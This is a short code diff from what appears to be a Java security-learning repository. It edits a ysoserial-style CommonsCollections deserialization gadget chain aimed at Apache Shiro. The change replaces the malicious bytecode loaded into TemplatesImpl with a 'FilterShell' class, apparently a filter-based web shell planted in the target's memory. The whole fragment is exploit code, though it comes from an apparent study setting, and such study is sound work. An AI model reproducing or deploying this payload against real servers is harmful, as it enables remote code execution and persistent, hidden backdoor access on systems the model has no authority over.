@@ -4,6 +4,7 @@ import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
 import com.xjjlearning.hack.java.basic.classloader.bytecodes.EvilTemplatesImpl;
 import com.xjjlearning.hack.java.ysoserial.payloads.util.ClassUtil;
+import com.xjjlearning.hack.java.ysoserial.payloads.util.FilterShell;
 import com.xjjlearning.hack.java.ysoserial.payloads.util.SerializationUtil;
 import org.apache.commons.collections.Transformer;
 import org.apache.commons.collections.functors.InvokerTransformer;
@@ -44,7 +45,8 @@ public class CommonsCollectionsShiro {
         class TFactory extends TransformerFactoryImpl {
         }
 
-        byte[] code = ClassUtil.classAsBytes(EvilTemplatesImpl.class);
+//        byte[] code = ClassUtil.classAsBytes(EvilTemplatesImpl.class);
+        byte[] code = ClassUtil.classAsBytes(FilterShell.class);
 
         TemplatesImpl templates = new TemplatesImpl();
         setFieldValue(templates, "_name", "");
